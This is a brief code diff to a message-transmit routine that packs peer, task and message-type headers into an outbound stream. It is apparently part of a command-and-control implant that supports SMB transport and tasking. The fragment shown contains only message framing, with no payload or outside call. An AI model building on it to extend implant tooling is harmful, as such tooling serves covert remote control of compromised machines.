@@ -146,7 +146,7 @@ namespace Message {
     VOID MessageTransmit() {
         HEXANE
 
-        PSTREAM Outbound    = { };
+        PSTREAM Outbound    = Stream::CreateStream();
         PSTREAM Inbound     = { };
         PSTREAM Head        = { };
         PSTREAM Swap        = { };
@@ -156,11 +156,13 @@ namespace Message {
 #ifdef TRANSPORT_SMB
             return_defer(ERROR_SUCCESS);
 #endif
-            Outbound = Stream::CreateStreamWithHeaders(TypeTasking);
-        } else {
-            Outbound = Stream::CreateStream();
-            Head = Ctx->Transport.OutboundQueue;
+            Stream::PackDword(Outbound, __builtin_bswap32(Ctx->Session.PeerId));
+            Stream::PackDword(Outbound, __builtin_bswap32(Ctx->Session.CurrentTaskId));
+            Stream::PackDword(Outbound, __builtin_bswap32(TypeTasking));
 
+        } else {
+
+            Head = Ctx->Transport.OutboundQueue;
             while (Head) {
                 if (Head->Length + MESSAGE_HEADER_SIZE + Outbound->Length > MESSAGE_MAX) {
                     break;
